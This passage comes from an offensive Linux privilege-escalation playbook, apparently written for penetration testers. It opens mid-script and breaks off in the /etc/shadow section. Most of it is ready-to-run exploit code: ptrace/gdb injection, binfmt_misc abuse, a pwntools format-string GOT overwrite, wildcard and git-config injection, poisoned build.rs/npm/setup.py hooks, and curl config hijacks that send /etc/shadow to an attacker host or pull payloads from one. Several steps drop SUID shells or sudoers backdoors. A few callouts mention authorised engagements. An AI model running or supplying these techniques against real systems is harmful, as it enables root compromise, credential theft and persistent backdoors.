import os, signal, time
os.waitpid(pid, 0)

# At this point you are attached — inject shellcode or use /proc/<pid>/mem
# Simpler: write a reverse shell command via /proc/pid/mem at a known address
print(f"[+] Attached to PID {pid} as root-equivalent")
libc.ptrace(PTRACE_DETACH, pid, 0, 0)
' <ROOT_PID>
```

```bash
# Method 2: GDB with cap_sys_ptrace (more reliable for code injection)
gdb -q -p <ROOT_PID> -batch \
  -ex 'call (int)system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")' \
  -ex 'detach' \
  -ex 'quit'
/tmp/rootbash -p
```

```bash
# Method 3: Inject bind shell shellcode via /proc/<PID>/mem (no gdb needed)
# Generate shellcode (on attacker box):
# msfvenom -p linux/x64/shell_bind_tcp LPORT=5555 -f hex
# Then write to an executable region of the target process via /proc/<PID>/mem
# (complex — use the gdb method above when available)
```

#### Living-off-the-land / LOTL variant

```bash
# If gdb is available (often is on dev boxes):
gdb -q -p <ROOT_PID> -batch -ex 'call (int)system("id > /tmp/ptrace_proof")' -ex 'detach' -ex 'quit'
cat /tmp/ptrace_proof

# If only python3 has the cap: use the ctypes approach above
# If neither gdb nor python3 has it but you have the raw cap:
# Write directly to /proc/<ROOT_PID>/mem (requires calculating RIP + writable region)
cat /proc/<ROOT_PID>/maps | grep "r-xp" | head -5
```

### 4.3d binfmt_misc Credentials-Flag Privesc (cap_dac_override or Write to /proc/sys/fs/binfmt_misc)

If you can write to `/proc/sys/fs/binfmt_misc/register` (via `cap_dac_override`, a container misconfiguration, or direct mount access), register a handler with the `C` (credentials) flag. The `C` flag causes the kernel to execute the interpreter with the credentials of the *binary being run* — meaning if you register a handler for SUID-root binaries, your interpreter runs as root.

```bash
# Detect — can you write to binfmt_misc?
ls -la /proc/sys/fs/binfmt_misc/register
cat /proc/sys/fs/binfmt_misc/status
# If mounted and writable (common in containers with --privileged or cap_dac_override):
mount | grep binfmt_misc

# Also check: do you have cap_dac_override?
getcap -r / 2>/dev/null | grep dac_override
grep -i cap /proc/self/status
```

```bash
# Step 1: Create interpreter script that spawns a shell
cat > /tmp/binfmt_handler <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod u+s /tmp/rootbash
exec /usr/bin/python3 "$@" 2>/dev/null
EOF
chmod +x /tmp/binfmt_handler

# Step 2: Register a binfmt_misc entry with the C (credentials) flag
# Format: :name:type:offset:magic:mask:interpreter:flags
# Target Python scripts (magic bytes matching #!/usr/bin/python3 shebang isn't needed — use ELF magic for SUID binaries)
echo ':pwn:M::\x7fELF:\xff\xff\xff\xff:/tmp/binfmt_handler:C' > /proc/sys/fs/binfmt_misc/register

# Step 3: Execute any SUID-root ELF binary — kernel runs /tmp/binfmt_handler AS ROOT
/usr/bin/su --help 2>/dev/null
# The C flag causes binfmt_handler to inherit su's SUID credentials

# Step 4: Collect
/tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# The technique uses only bash + echo + chmod — fully LOTL
# Prerequisite is write access to /proc/sys/fs/binfmt_misc/register
# In containers: often available by default with --privileged flag
# On host: requires cap_dac_override or running in a user namespace with binfmt_misc mounted
```

### 4.3e Format String Exploitation — %n GOT Overwrite via printf(user_input)

When a SUID-root binary passes user-controlled input directly to `printf()` without a format string (`printf(buf)` instead of `printf("%s", buf)`), the `%n` specifier writes to memory. Combined with GOT overwrite, this yields code execution as the binary's effective user (root if SUID).

```bash
# Detect — identify format string vulnerability
ltrace <SUID_BINARY> <<< 'AAAA%08x.%08x.%08x.%08x'
# If output shows hex values (stack leak), it's vulnerable
./<SUID_BINARY> 'AAAA%08x.%08x.%08x.%08x'
# Vulnerable output: AAAA41414141.xxxxx.xxxxx.xxxxx

# Step 1: Find the offset (position of your input on the stack)
for i in $(seq 1 20); do echo -n "$i: "; ./<SUID_BINARY> "AAAA%${i}\$x"; echo; done
# When output shows 41414141 → that's your offset (e.g., offset=7)
```

```python
# Step 2: pwntools exploitation — overwrite printf@GOT with system()
from pwn import *

elf = ELF('<SUID_BINARY>')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Leak libc address via format string
io = process(elf.path)
io.sendline(b'%<OFFSET>$s' + p64(elf.got['printf']))  # leak printf@GOT

leaked = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leaked - libc.symbols['printf']
log.success(f'libc base: {hex(libc.address)}')

# Overwrite printf@GOT with system() using fmtstr_payload
io2 = process(elf.path)
payload = fmtstr_payload(<OFFSET>, {elf.got['printf']: libc.symbols['system']})
io2.sendline(payload)

# Next call to printf(buf) becomes system(buf) — send "/bin/sh"
io2.sendline(b'/bin/sh')
io2.interactive()
```

#### Living-off-the-land / LOTL variant

```bash
# Manual %hhn writes (no pwntools — works from target shell directly)
# Calculate target address and value bytes, then construct format string:
# printf '\x<GOT_ADDR_BYTES>%<PAD>c%<OFFSET>$hhn' | ./<SUID_BINARY>
# This is tedious manually but possible without any tools beyond printf + the SUID binary
# For exam: use pwntools on attacker box, pipe payload via stdin to target over SSH/shell
```

### 4.4 Cron Job Hijacking

> **🛑 RoE note — this section enumerates and abuses *existing* cron jobs for privesc.** Creating *new* cron entries as a persistence primitive is governed by the §5.2 RoE callout: only fire when the engagement validates persistence, use a `engagement-test-<TS>` marker comment, coordinate with the detection team, remove at end of engagement.

```bash
# Check all cron locations
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l
ls -la /var/spool/cron/crontabs/

# Writable script executed by root cron
# 🔴 chmod +s on /bin/bash = trivially-detectable SUID anomaly (auditd PERM_MOD on a system binary, plus integrity checks via aide/tripwire/CrowdStrike file-integrity). Engagement-only — for disclosure proof, write a marker file as root via the cron-injected command instead of suid'ing a shell.
echo 'chmod +s /bin/bash' >> /path/to/writable_script.sh
# Wait for cron → /bin/bash -p

# PATH hijacking in cron
# If cron runs a command without full path and PATH is writable:
echo '#!/bin/bash' > /tmp/command_name
echo 'chmod +s /bin/bash' >> /tmp/command_name
chmod +x /tmp/command_name
# Ensure /tmp is in PATH before the real binary location

# Wildcard injection (e.g., tar with * in cron)
# If cron runs: tar czf /tmp/backup.tar.gz *
echo "" > "/path/--checkpoint=1"
echo "" > "/path/--checkpoint-action=exec=sh shell.sh"
```

### 4.4b Wildcard Injection — Extended Reference

Any time a root-run command uses `*` (or any glob) over a directory you can write to, you can inject filenames that the shell expands into command-line arguments — turning data files into flags. Trick: many tools have flags that start with `--` or `-`, and globs don't escape them.

```bash
# === DETECT — find cron/scripts using globs over writable dirs ===
grep -rE '\*|\$\{?@}?|"\$\*"' /etc/cron* /etc/systemd/system/ 2>/dev/null
ls -la /opt /var/backups /srv 2>/dev/null    # common backup target dirs you may be able to write
```

```bash
# === tar wildcard (most common — checkpoint-action runs arbitrary command) ===
# Vulnerable cron line:  cd /home/user && tar czf /backup/files.tar.gz *
cd /home/user
echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# When tar expands * → it sees:  --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh
# Wait for cron → /tmp/rootbash -p

# Alternative: --to-command (executes for every file)
touch -- '--to-command=sh shell.sh'
```

```bash
# === rsync wildcard ===
# Vulnerable line:  rsync -av * /backup/
# rsync honors -e (remote shell) and --rsh as command-line args
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' > shell.sh
chmod +x shell.sh
touch -- '-e sh shell.sh'
# rsync expands * → sees `-e sh shell.sh` and runs sh shell.sh

# Newer rsync (≥3.2.4) requires --rsh long form
touch -- '--rsh=sh shell.sh'
```

```bash
# === chown / chmod wildcard ===
# Vulnerable line:  chown -R appuser:appuser /var/data/*
# chown supports --reference=FILE to copy ownership from another file.
# By creating a file in the glob dir owned by your user, then a symlink whose name
# is --reference=<that_file>, chown will set EVERY matched file to your ownership.
cd /var/data
touch /tmp/myfile                                # owned by you
ln -s /tmp/myfile -- '--reference=/tmp/myfile'
# When chown expands *: --reference=/tmp/myfile <other files> → all files chowned to you

# Same idea for chmod via --reference
touch /tmp/777file && chmod 777 /tmp/777file
ln -s /tmp/777file -- '--reference=/tmp/777file'
# After cron: every file in /var/data becomes 777
```

```bash
# === find -exec via filename meta-chars ===
# Vulnerable line:  find /tmp/uploads -type f -exec rm {} \;
# Less direct — find with -exec uses {}, can't be injected the same way.
# BUT if a script does:  find /tmp/uploads -type f | xargs CMD
# OR:                    for f in /tmp/uploads/*; do echo $f; done   (unquoted $f)
# Then a filename with shell metacharacters fires:
cd /tmp/uploads
touch -- '-exec sh -c "id>/tmp/pwn" \;'         # injects into find arg list
touch -- '$(/bin/bash -c "id>/tmp/pwn")'        # injects on unquoted-var expansion
touch -- ';bash;'                                # backtick/semicolon in unquoted contexts
```

```bash
# === zip / unzip wildcard ===
# Vulnerable line:  zip -r /backup/site.zip *
# zip supports -T (test) which can run an arbitrary command:
touch -- '-T'
touch -- '-TT=sh shell.sh'
# When zip expands * → -T -TT=sh shell.sh <other files>

# unzip with wildcard — usually safe; but unzip -x can be triggered if attacker
# controls files alongside an .zip:  unzip *.zip -d /target → see HackTricks
```

```bash
# === 7z / 7za wildcard ===
# Vulnerable line:  7z a /backup/all.7z *
# 7z reads filenames starting with @ as "list files" — can leak file contents via error
touch @/etc/shadow
# 7z tries to read /etc/shadow as a list-file → its contents leak in the error message
# (Read primitive only — useful when shadow is otherwise unreadable)
```

```bash
# === scp wildcard (less common but classic) ===
# Vulnerable line:  scp * user@host:/dst/
# scp doesn't support -e directly, but `scp -S` selects an alternate ssh program
touch -- '-S=sh'
touch shell.sh
# When * expands: -S=sh shell.sh user@host:/dst → scp tries to use 'sh shell.sh' as transport
```

```bash
# === ImageMagick policy.xml + filename injection ===
# Vulnerable: web app calls `convert <filename> <out>` over user-uploaded files
# without sanitizing filename. Old ImageMagick (<7.0.10-31) parses MSL/EPHEMERAL/etc.
# Modern attack: filename containing pipe/semicolon when convert is invoked unquoted.
#   convert "$file" out.png    ← safe (quoted)
#   convert $file out.png      ← exploitable
# Filename payload:
touch '|id>/tmp/pwn.png'
# When unquoted: convert | id>/tmp/pwn.png out.png

# ImageMagick policy bypass — check current restrictions
cat /etc/ImageMagick-*/policy.xml 2>/dev/null
# If 'EPHEMERAL' / 'URL' / 'MSL' / 'MVG' coders are NOT disabled → CVE-2016-3714 (ImageTragick) territory
# Craft .mvg payload (see exploit-db.com/exploits/39767) → uploaded → convert → RCE
```

```bash
# === GENERAL DEFENSE-AWARE NOTES ===
# - Filenames must be created with `--` separator on touch/echo to avoid the SHELL interpreting flags
#   touch -- '--checkpoint=1'    ✓
#   touch '--checkpoint=1'       ✗ (touch itself parses --checkpoint)
# - The injected file must be in the SAME directory the glob resolves over.
# - If the cron uses a sub-glob like /var/data/*.log, your filename must match (e.g., '--checkpoint=1.log')
# - Some cron scripts cd into the dir first (cd /var/data && tar ... *) — that's the easy case.
# - Some pass full paths (tar /var/data/*) — your injected files appear as /var/data/--checkpoint=1
#   which still works because tar parses argv[] regardless of leading path.
```

### 4.4c Writable Config File Consumed by Root — curl -K / --config

Any tool whose config file is writable by your user and runs as root via cron/systemd is a write/read-as-root primitive. The `curl -K <CONFIG>` case turns config-file directives (`output=`, `url=file://`, `upload-file=`) into arbitrary file operations. Distinct from wildcard injection — no glob needed; the file format itself is the primitive.

```bash
# === DETECT — root cron/systemd jobs invoking curl -K / --config ===
grep -rE 'curl.*(-K|--config)' /etc/cron* /etc/systemd/system/ /usr/local/bin/ /opt/ 2>/dev/null
ls -la <CURL_CONFIG_PATH>                                  # confirm user-writable, root-consumed
systemctl list-timers --all                                # find timers driving the curl invocation
```

```bash
# === ARBITRARY ROOT FILE READ — exfil via upload-file= to attacker-controlled URL ===
# Attacker (terminal 1):
#   nc -lvnp <ATTACKER_PORT>
# Or:
#   python3 -m http.server <ATTACKER_PORT>

# On target — overwrite the user-writable curl config consumed by the root job:
cat > <CURL_CONFIG_PATH> <<'EOF'
url = "http://<ATTACKER_IP>:<ATTACKER_PORT>/exfil"
upload-file = "/etc/shadow"
EOF
# Wait for cron/systemd → root-side curl POSTs /etc/shadow to <ATTACKER_IP>
```

```bash
# === ARBITRARY ROOT FILE WRITE — output= directive writes anywhere root can write ===
# Stage payload on attacker:
#   echo '<USER> ALL=(ALL) NOPASSWD: ALL' > /tmp/sudoers_drop
#   python3 -m http.server <ATTACKER_PORT>

# Replace the curl config with one that downloads attacker-hosted content to a root-write target:
cat > <CURL_CONFIG_PATH> <<'EOF'
url = "http://<ATTACKER_IP>:<ATTACKER_PORT>/sudoers_drop"
output = "/etc/sudoers.d/pwn"
EOF
# Wait for cron → /etc/sudoers.d/pwn lands as root → sudo -l shows NOPASSWD
sudo -l
sudo /bin/bash
```

```bash
# === LOCAL FILE READ via url=file:// (no egress required) ===
# Useful when target has no outbound network — write to a path your user can read.
cat > <CURL_CONFIG_PATH> <<'EOF'
url = "file:///root/.ssh/id_rsa"
output = "/tmp/loot_<USER>"
EOF
# After the next cron run:
ls -la /tmp/loot_<USER>
cat /tmp/loot_<USER>
```

```bash
# === SUID-bash drop via output= overwriting /etc/cron.d/ or a writable root-run script ===
# Host attacker payload:
#   echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /tmp/payload.sh
#   python3 -m http.server <ATTACKER_PORT>

cat > <CURL_CONFIG_PATH> <<'EOF'
url = "http://<ATTACKER_IP>:<ATTACKER_PORT>/payload.sh"
output = "/etc/cron.d/pwn-<USER>"
EOF
# Or output to an existing root-run script path you've already identified.
# After execution:
/tmp/rootbash -p
```

> **Tip:** The same primitive applies to any tool that consumes a user-writable config under a root-run job — `wget --config`, `rclone --config`, `rsync --files-from`, `tar -T`, `ssh -F`, `git -c include.path`. The config-file format is the attack surface; the directive set is whatever the tool exposes.

### 4.4d Rust/Cargo Build-Script Hijacking — `build.rs` RCE via Writable Crate Path

When a root cron / systemd timer / scheduled task runs `cargo build`, `cargo run`, `cargo test`, or `cargo install` in a project whose `Cargo.toml` (or any path-style dependency directory) is writable by your user, you have arbitrary code execution at compile time. Cargo executes any `build.rs` it finds in a dependency root *before* compiling the crate — there is no function-signature constraint, no source-file constraint, no language gate. Same primitive class applies to npm `preinstall`/`postinstall` scripts, Python `setup.py`, `Makefile` recipes, and `.gnu-stack` link-time hooks.

```bash
# === DETECT — root jobs invoking cargo / build commands over a writable tree ===
grep -rE 'cargo (build|run|test|install|check)|npm (install|ci|run)|pip install|make|gradle|go build' \
    /etc/cron* /etc/systemd/system/ /lib/systemd/system/ /usr/local/bin/ /opt/ 2>/dev/null
systemctl list-timers --all                                    # find timers driving the build
ls -la <PROJECT_DIR>/Cargo.toml <PROJECT_DIR>/Cargo.lock       # writable by you?
find <PROJECT_DIR> -writable \( -name 'Cargo.toml' -o -name 'build.rs' -o -name 'package.json' -o -name 'setup.py' -o -name 'Makefile' \) 2>/dev/null
pspy64 &                                                        # confirm the build runs as root and at what cadence
```

```bash
# === EXPLOIT A — drop build.rs directly into the writable crate root ===
# If <PROJECT_DIR> itself (the crate being built by root) is writable:
cat > <PROJECT_DIR>/build.rs <<'EOF'
use std::process::Command;
fn main() {
    Command::new("/bin/sh")
        .arg("-c")
        .arg("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
        .status()
        .ok();
}
EOF
# Cargo auto-discovers build.rs in the crate root — no Cargo.toml edit needed if absent.
# If a build.rs already exists, append the Command::new(...) block instead of overwriting.
# Wait for the cron/timer → /tmp/rootbash -p
```

```bash
# === EXPLOIT B — redirect a dependency to an attacker-writable local path ===
# When Cargo.toml itself is writable but the existing build.rs is not, point one
# of the project's dependencies at a path you control. Cargo runs the *dependency's*
# build.rs at compile time with the same privileges as the cargo invocation.

mkdir -p /tmp/evil_crate/src
cat > /tmp/evil_crate/Cargo.toml <<'EOF'
[package]
name = "<EXISTING_DEP_NAME>"
version = "0.0.1"
edition = "2021"
build = "build.rs"
EOF
cat > /tmp/evil_crate/src/lib.rs <<'EOF'
EOF
cat > /tmp/evil_crate/build.rs <<'EOF'
use std::process::Command;
fn main() {
    Command::new("/bin/sh")
        .arg("-c")
        .arg("echo '<USER> ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn")
        .status()
        .ok();
}
EOF

# Now patch the root-built project's Cargo.toml to redirect that dep to your local crate.
# Use [patch.crates-io] (preferred — minimal diff, picked up by cargo build):
cat >> <PROJECT_DIR>/Cargo.toml <<'EOF'

[patch.crates-io]
<EXISTING_DEP_NAME> = { path = "/tmp/evil_crate" }
EOF
# Or, if you can edit the [dependencies] table directly:
#   <EXISTING_DEP_NAME> = { path = "/tmp/evil_crate" }

# Wait for cron → root cargo build → /tmp/evil_crate/build.rs runs as root
sudo -l
sudo /bin/bash
```

```bash
# === EXPLOIT C — minimal trigger via Cargo.toml [build-dependencies] ===
# If the crate has no build.rs and no easy dep to redirect, add one with a build dep
# whose build.rs fires. Smallest possible footprint in the target Cargo.toml:
cat >> <PROJECT_DIR>/Cargo.toml <<'EOF'

[build-dependencies]
helper = { path = "/tmp/evil_crate" }
EOF
# Then drop a stub Cargo.toml + build.rs at /tmp/evil_crate as in Exploit B.
# Cargo resolves build-deps before compilation → root executes /tmp/evil_crate/build.rs.
```

```bash
# === ADJACENT — same primitive, other ecosystems ===
# npm: package.json "scripts": {"preinstall": "..."} runs on `npm install` / `npm ci`
jq '.scripts.preinstall = "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash"' \
    <PROJECT_DIR>/package.json > /tmp/pkg.json && mv /tmp/pkg.json <PROJECT_DIR>/package.json

# Python: setup.py / pyproject.toml — root pip install <writable-project> executes setup.py
cat > <PROJECT_DIR>/setup.py <<'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
from setuptools import setup
setup(name="x", version="0.0.1")
EOF

# Makefile: root `make` in writable dir → any recipe runs as root
echo -e "all:\n\tcp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash" > <PROJECT_DIR>/Makefile
```

> **Tip:** Build-system hijacks share a class signature with §4.4 cron-script-hijack but operate at *compile time* rather than runtime. Look for any root-run job that invokes a build/install/package command (`cargo`, `npm`, `pip`, `make`, `gradle`, `go build`, `dotnet restore`) over a tree where you can write *any* file the build pipeline reads — `Cargo.toml`, `package.json`, `setup.py`, `Makefile`, `build.gradle`, `pom.xml`, `.cargo/config.toml`, `~/.cargo/registry/`. The toolchain itself is the exec primitive.

### 4.4e Git Config Privesc — core.fsmonitor / core.sshCommand / hooksPath / pager

When a privileged user (root cron, another user's git hook, CI runner) executes `git` operations inside a repository you can write to, several git config directives execute arbitrary commands. Detection via `pspy` shows the git invocation; exploitation is dropping a `.git/config` or `.gitconfig` that triggers code execution on the next `git status`/`git pull`/`git commit`.

```bash
# Detect — find root/other-user git operations via pspy or cron inspection
grep -rE "git (pull|fetch|status|log|commit|push|clone)" /etc/cron* /var/spool/cron/ 2>/dev/null
systemctl list-timers --all 2>/dev/null
# Run pspy to catch periodic git operations by root
./pspy64 2>/dev/null | grep -i git
```

```bash
# Exploit A: core.fsmonitor — executes on ANY git command (status, diff, add, commit)
# Requires: write access to .git/config in a repo where root runs git
cd <REPO_PATH>
git config core.fsmonitor "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash && echo"
# Next time root runs `git status` (or any git command) in this repo → payload fires
# Collect: /tmp/rootbash -p
```

```bash
# Exploit B: core.sshCommand — fires on git fetch/pull/push over SSH
git config core.sshCommand "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; ssh"
# Triggers when root does: git pull / git fetch / git push
```

```bash
# Exploit C: core.hooksPath — redirect hooks to attacker-controlled directory
mkdir -p /tmp/evil-hooks
cat > /tmp/evil-hooks/pre-commit <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash
EOF
chmod +x /tmp/evil-hooks/pre-commit
git config core.hooksPath /tmp/evil-hooks
# Triggers on: git commit (pre-commit), git push (pre-push), etc.
```

```bash
# Exploit D: core.pager / core.editor — fires on git log, git diff, git commit
git config core.pager "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; less"
git config core.editor "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; vim"
# Pager triggers on: git log, git diff, git show (any paged output)
# Editor triggers on: git commit (without -m), git rebase
```

```bash
# Exploit E: include.path — include a malicious gitconfig from writable location
cat > /tmp/evil.gitconfig <<'EOF'
[core]
    fsmonitor = "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash && echo"
EOF
git config include.path /tmp/evil.gitconfig
```

```bash
# Exploit F: gitattributes filter — fires on git checkout / git add
# Create .gitattributes in the repo root (writable to you)
echo '* filter=pwn' > <REPO_PATH>/.gitattributes
git config filter.pwn.clean "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; cat"
git config filter.pwn.smudge "cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash; cat"
# Triggers on: git checkout, git add, git diff (any content filtering)
```

#### Living-off-the-land / LOTL variant

```bash
# All exploits above use only git config (ships with git) + shell commands
# No external tools needed — the git binary itself is the execution engine
# Minimum: write access to .git/config (or global ~/.gitconfig for the target user)
```

### 4.4f Bash Arithmetic-Context Command Injection — (( )) and [[ -eq ]]

Bash evaluates `$(...)` and backticks recursively inside arithmetic contexts (`(( ))`, `[[ x -eq y ]]`, `$[...]`, `let`). When a root-run script compares an attacker-tainted variable using integer comparison, the `a[$(...)]` payload format triggers arbitrary command execution inside the arithmetic evaluator.

```bash
# Vulnerable pattern in a root-run script:
# #!/bin/bash
# read -r val < /tmp/user_input   (or val from attacker-writable file/env)
# if [[ "$val" -eq 42 ]]; then ...
# OR: (( val == 42 ))
# OR: result=$((val + 1))

# Exploitation: set the tainted variable to an array subscript with command substitution
# The payload: a[$(COMMAND)]  — bash evaluates COMMAND during arithmetic parsing

# Step 1: Identify the writable input source consumed by the root script
cat /etc/cron* /var/spool/cron/* 2>/dev/null | grep -E '\[\[.*-eq|-ne|-gt|-lt|-ge|-le\]|\(\('
find /etc/cron* -exec grep -lE '\$\(\(' {} \; 2>/dev/null
# Look for scripts that read from files/env you control, then use the value in arithmetic

# Step 2: Inject the payload into the attacker-controlled input
echo 'a[$(cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash)]' > /tmp/user_input
# Or if the script reads from an env var / command arg:
export ATTACKER_VAR='a[$(cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash)]'

# Step 3: Wait for the cron/root-script to evaluate it
# When bash hits: [[ "$val" -eq 42 ]]
# It parses "a[$(cp /bin/bash ...)]" as arithmetic → evaluates the $(...) → root RCE

# Collect
/tmp/rootbash -p
```

```bash
# Variant: metadata injection via exiftool + arithmetic comparison
# If a root script reads EXIF metadata and compares it numerically:
# width=$(exiftool -s3 -ImageWidth "$file")
# if [[ "$width" -eq 1920 ]]; then ...
# Inject the payload into the EXIF tag:
exiftool -ImageWidth='a[$(cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash)]' <IMAGE_FILE>
# When the root script reads and compares it → RCE
```

#### Living-off-the-land / LOTL variant

```bash
# The injection IS the technique — you only need to write to the input source
# No tools beyond echo/printf needed on the target
# The vulnerable script does the execution for you via bash's own arithmetic parser
echo 'a[$(id > /tmp/proof)]' > <ATTACKER_WRITABLE_INPUT>
```

### 4.4g Bash [[ ]] Glob Pattern-Matching Oracle — Char-by-Char Secret Leak

When a root-run script uses unquoted RHS in `[[ $secret == $user_input ]]`, bash interprets glob metacharacters (`*`, `?`, `[...]`) in `$user_input` as pattern-matching operators rather than literal characters. By iterating single characters with `?` wildcards, an attacker leaks the secret byte-by-byte via exit code timing/observation.

```bash
# Vulnerable pattern in a root-run script:
# #!/bin/bash
# SECRET=$(cat /root/secret.txt)
# read -r guess
# if [[ $SECRET == $guess ]]; then echo "correct"; fi
# NOTE: the RHS ($guess) is UNQUOTED — bash treats it as a glob pattern

# Exploitation: brute-force character by character using glob patterns
# The glob 'A*' matches any string starting with 'A'
# If the script outputs "correct" (or has observable side effects), you know the prefix

# Step 1: Identify the feedback channel (output, timing, file creation, etc.)
# Step 2: Iterate characters

# Manual single-char test
echo 'a*' > /tmp/guess_input     # does the script match? if yes, secret starts with 'a'
echo 'b*' > /tmp/guess_input     # test 'b'...

# Automated oracle (when you can observe the script's exit code or output)
KNOWN=""
CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}"
while true; do
  FOUND=0
  for c in $(echo "$CHARSET" | fold -w1); do
    echo "${KNOWN}${c}*" > /tmp/guess_input
    # Trigger the root script and check for match feedback
    # (method depends on how the script is invoked — cron output, log file, etc.)
    if grep -q "correct" /tmp/script_output 2>/dev/null; then
      KNOWN="${KNOWN}${c}"
      FOUND=1
      echo "[+] Found: $KNOWN"
      break
    fi
  done
  [ $FOUND -eq 0 ] && break
done
echo "[*] Secret: $KNOWN"
```

#### Living-off-the-land / LOTL variant

```bash
# Pure bash — no tools needed beyond echo and the ability to write to the input source
# The glob pattern itself is the oracle; bash's built-in pattern matching does the work
# Same technique works against [[ $x == $y ]] or case $x in $y) patterns
```

### 4.4h Gnuplot system() RCE via Writable .plt Directory

When a root cron/systemd job executes gnuplot scripts from a directory you can write to, gnuplot's `system()` function and backtick evaluation provide arbitrary command execution.

```bash
# Detect — find root-invoked gnuplot
grep -rE "gnuplot" /etc/cron* /etc/systemd/system/ /usr/local/bin/ /opt/ 2>/dev/null
find / -name "*.plt" -o -name "*.gnuplot" 2>/dev/null | xargs ls -la 2>/dev/null
# Check if the .plt directory or files are writable
find / -name "*.plt" -writable 2>/dev/null
```

```bash
# Exploit — inject system() call into writable .plt file
cat > <WRITABLE_PLT_PATH>/pwn.plt <<'EOF'
system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
EOF

# Or modify an existing .plt file (append to end)
echo 'system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")' >> <EXISTING_PLT_FILE>

# Alternative: backtick evaluation (gnuplot evaluates backticks as shell commands)
echo 'title = `cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash`' >> <EXISTING_PLT_FILE>

# Wait for cron/timer → /tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# Only echo/cat needed to write the payload — gnuplot itself runs it
# No external tools required on target beyond write access to the .plt path
echo 'system("id > /tmp/gnuplot_proof")' > <WRITABLE_PLT_PATH>/test.plt
```

### 4.4i IPython CWD profile_default/startup Auto-Execution (CVE-2022-21699)

IPython < 8.0.1 loads `profile_default/startup/*.py` from the current working directory. If a privileged user (root cron, another user) runs `ipython` or `jupyter` from a directory you can write to, any `.py` file in `./profile_default/startup/` executes automatically.

```bash
# Detect — find privileged ipython/jupyter invocations
grep -rE "ipython|jupyter" /etc/cron* /var/spool/cron/ /etc/systemd/system/ 2>/dev/null
ps auxf | grep -iE "ipython|jupyter" | grep -v grep
# Check ipython version
ipython --version 2>/dev/null   # vulnerable: < 8.0.1

# Identify the CWD of the target invocation
ls -la /proc/<PID>/cwd 2>/dev/null
```

```bash
# Exploit — plant startup script in CWD
mkdir -p <TARGET_CWD>/profile_default/startup
cat > <TARGET_CWD>/profile_default/startup/00-pwn.py <<'EOF'
import os
os.system("cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash")
EOF

# Wait for the privileged ipython session to start → /tmp/rootbash -p
```

#### Living-off-the-land / LOTL variant

```bash
# Only mkdir + cat/echo needed — ipython loads the file itself
# No pip install, no downloads required
mkdir -p ./profile_default/startup
echo 'import os; os.system("id > /tmp/ipy_proof")' > ./profile_default/startup/00-pwn.py
```

### 4.4j git apply Symlink Privesc (CVE-2023-23946)

When `sudo -l` allows `git apply` as root (or another user), CVE-2023-23946 allows writing to arbitrary paths via a crafted patch that first creates a symlink, then writes through it. Affects git < 2.39.2.

```bash
# Detect
sudo -l | grep -i "git"
git --version   # vulnerable: < 2.39.2

# Step 1: Create a malicious patch that plants a symlink then writes through it
cat > /tmp/evil.patch <<'EOF'
diff --git a/symlink b/symlink
new file mode 120000
index 0000000..<BLOB_HASH>
--- /dev/null
+++ b/symlink
@@ -0,0 +1 @@
+/etc/sudoers.d/pwn
\ No newline at end of file
diff --git a/symlink b/symlink
deleted file mode 120000
index <BLOB_HASH>..0000000
--- a/symlink
+++ /dev/null
@@ -1 +0,0 @@
-/etc/sudoers.d/pwn
\ No newline at end of file
diff --git a/symlink b/symlink
new file mode 100644
index 0000000..0000000
--- /dev/null
+++ b/symlink
@@ -0,0 +1 @@
+<USER> ALL=(ALL) NOPASSWD: ALL
EOF

# Step 2: Apply as root
cd /tmp/workdir && git init
sudo git apply /tmp/evil.patch
# Result: /etc/sudoers.d/pwn is created with our content

# Step 3: Escalate
sudo /bin/bash
```

#### Living-off-the-land / LOTL variant

```bash
# Requires only git (already present if sudo allows it) + cat to create the patch
# The patch format itself does the symlink traversal — no external tools
```

### 4.5 Writable /etc/passwd
```bash
# Check permissions
ls -la /etc/passwd

# If writable — add root user
# 🔴 alert-likely + persistence vector — appending to /etc/passwd creates a backdoor account. PER OFFSEC RULES §5: this is read-only-proof territory in real engagements. Prove the writable-passwd primitive with `cat /etc/shadow` (proves uid=0 reachable via the writable-passwd → su path) + `id`, do NOT actually append the line. Append only on lab/CPTS targets.
openssl passwd -1 -salt hacker P@ssw0rd
# Copy hash, then:
echo 'hacker:<HASH>:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

### 4.5b Writable /etc/shadow
```bash
# Check permissions
ls -la /etc/shadow

# If writable — replace root's hash
# Generate hash
openssl passwd -6 -salt xyz P@ssw0rd
